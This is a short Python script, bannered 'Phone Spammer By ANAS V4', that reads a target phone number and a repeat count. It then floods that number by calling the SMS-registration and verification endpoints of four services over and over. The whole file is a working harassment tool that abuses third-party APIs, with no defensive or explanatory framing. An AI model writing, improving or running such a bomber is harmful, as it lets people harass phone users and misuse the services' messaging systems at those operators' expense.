import requests, json, random, sys, colorama
from colorama import Fore
r = Fore.RED
g = Fore.GREEN
b = Fore.BLUE
print(g+ """

  _______  _______  _______  _______  _______  _______  _______ 
 (  ____ \(  ____ )(  ___  )(       )(       )(  ____ \(  ____ )
 | (    \/| (    )|| (   ) || () () || () () || (    \/| (    )|
 | (_____ | (____)|| (___) || || || || || || || (__    | (____)|
 (_____  )|  _____)|  ___  || |(_)| || |(_)| ||  __)   |     __)
       ) || (      | (   ) || |   | || |   | || (      | (\ (   
 /\____) || )      | )   ( || )   ( || )   ( || (____/\| ) \ \__
 \_______)|/       |/     \||/     \||/     \|(_______/|/   \__/
                                                                

                 Phone Spammer By ANAS V4
                          4 API 
""")
t = raw_input("[*] Enter number: ")
e = raw_input("[*] Enter count: ")
n = 1
for x in range(int(e)):
	
    print(requests.post(url="https://isacoapp.isaco.ir/api/Account/RegisterMobileNumber?mobileNumber=%s"%t, headers={'Content-Type':'application/json'}).status_code),
    print(requests.post(url="https://ghasedak24.com/user/ajax_register", data="username=%s"%t, headers={'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).status_code),
    print(requests.get(url="http://ir-learn.com/telegram/send.php?number=%s"%t).status_code),
    print(requests.post(url="https://www.filimo.com/_/api/fa/v1/user/Authenticate/country_code?", data="mobile=%s"%t +"&guid=2154d0b3ff3ead4683b720ff690c5e2c", headers={'Content-Type' : 'application/x-www-form-urlencoded'}).status_code),
    sys.stdout.flush()
    print(b+"\r[+] %s"%n),
    n= n+1